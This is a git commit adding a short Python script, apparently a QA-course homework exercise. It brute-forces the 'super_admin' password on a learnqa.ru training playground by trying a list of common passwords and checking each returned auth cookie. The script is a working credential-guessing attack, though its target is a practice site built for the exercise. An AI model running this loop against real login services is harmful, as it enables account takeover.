edd9ba9fa3099339d41e7373c23d74bbf7f5a17a
evgeniysheremet <e.sheremet@ibolit.pro>
2023-11-10 16:38:31 +0300

    Ex9

---
+++ Ex9.py
@@ -0,0 +1,18 @@
+import requests
+
+passwords_list = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111",
+                  "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely",
+                  "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"]
+
+for passwrd in passwords_list:
+    data = {"login": "super_admin", "password": passwrd}
+    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=data)
+    cookie_value = (response1.cookies.get_dict()["auth_cookie"])
+
+    cookies = {'auth_cookie': cookie_value}
+    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
+    if response2.text == "You are NOT authorized":
+        continue
+    else:
+        print(response2.text)
+        print("Correct password: ", passwrd)
